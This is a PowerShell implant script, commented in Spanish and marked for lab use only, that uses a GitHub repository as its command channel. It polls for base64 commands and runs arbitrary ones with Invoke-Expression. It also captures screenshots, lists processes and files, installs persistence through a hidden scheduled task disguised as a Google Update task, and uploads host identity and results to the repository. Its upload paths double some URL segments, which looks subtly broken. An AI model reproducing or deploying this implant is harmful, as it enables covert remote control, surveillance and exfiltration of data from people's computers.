# ============================================================
# agent_gh.ps1 - Implant canal GitHub GitPower 100% (lab)
# Tasking: GET contents/cmd.txt (base64) - Exfil: PUT contents/out/
# USO EXCLUSIVO EN LAB AISLADO.
# Uso: powershell -f agent_gh.ps1 -Pat <PAT> -Repo <owner/repo>
# ============================================================
param([string]$Pat, [string]$Repo)
$ErrorActionPreference = 'SilentlyContinue'
$hdr = @{
    Authorization = "Bearer $Pat"
    'User-Agent'  = 'gitpower-lab'
    Accept        = 'application/vnd.github+json'
}
$tag  = "$env:COMPUTERNAME`_$env:USERNAME"
$api  = "https://api.github.com/repos/$Repo/contents"
$last = ''

function GH([string]$m, [string]$u, [string]$b) {
    Invoke-RestMethod -Uri $u -Method $m -Headers $hdr -ContentType 'application/json' -Body $b
}

function PutOut([string]$name, [string]$b64content, [string]$msg) {
    $j = @{ message = $msg; content = $b64content } | ConvertTo-Json -Compress
    GH PUT "$api/contents/out/$name" $j | Out-Null
}

function Txt64([string]$s) {
    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s))
}

PutOut "out/$tag-checkin.txt" (Txt64 "[CHECKIN] $env:COMPUTERNAME\$env:USERNAME | agent_gh.ps1") 'checkin'

while ($true) {
    try {
        $r = GH GET "$api/contents/cmd.txt" $null
        $cmd = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($r.content -replace "`n", '')))
        if ($cmd -and $cmd -ne $last) {
            $last = $cmd
            $ts = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
            $result = ''

            if ($cmd -eq 'SHOT') {
                Add-Type -AssemblyName System.Windows.Forms
                Add-Type -AssemblyName System.Drawing
                $bounds = [Windows.Forms.Screen]::PrimaryScreen.Bounds
                $b = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
                $g = [System.Drawing.Graphics]::FromImage($b)
                $g.CopyFromScreen(0, 0, 0, 0, $b.Size)
                $g.Dispose()
                $ms = New-Object System.IO.MemoryStream
                $enc = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
                $ep = New-Object System.Drawing.Imaging.EncoderParameters 1
                $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, [long]55)
                $b.Save($ms, $enc, $ep)
                PutOut "out/${tag}_$ts.jpg" ([Convert]::ToBase64String($ms.ToArray())) 'shot'
                $result = '[+] shot exfil'
            }
            elseif ($cmd -eq 'PROCS') {
                $result = Get-Process | Select-Object Id, ProcessName | Out-String
            }
            elseif ($cmd -like 'LS *') {
                $result = Get-ChildItem ($cmd.Substring(3)) -ErrorAction SilentlyContinue | Out-String
            }
            elseif ($cmd -eq 'PERSIST') {
                $me = $PSCommandPath
                schtasks /create /f /sc minute /mo 10 /tn 'GoogleUpdateTaskMachineWake{D1C79120-CA8D-6D04-AC55-11E498ABE7C3}' /tr "powershell -nop -w hidden -ep bypass -file `"$me`" -Pat `"$Pat`" -Repo `"$Repo`"" | Out-Null
                $result = '[+] persistencia ok'
            }
            elseif ($cmd -like 'MSG *') {
                $t = $cmd.Substring(4)
                Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-nop -c `"Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.MessageBox]::Show('$t','://msg')`""
                $result = '[+] msgbox lanzado'
            }
            else {
                $result = Invoke-Expression $cmd 2>&1 | Out-String
                if ($result.Length -gt 400000) { $result = $result.Substring(0, 400000) + '[truncado]' }
            }

            if ($result) {
                PutOut "out/${tag}_$ts.txt" (Txt64 "[$tag] > $cmd`n$result") 'res'
            }
        }
    } catch { }

    Start-Sleep -Seconds (Get-Random -Minimum 20 -Maximum 35)
}
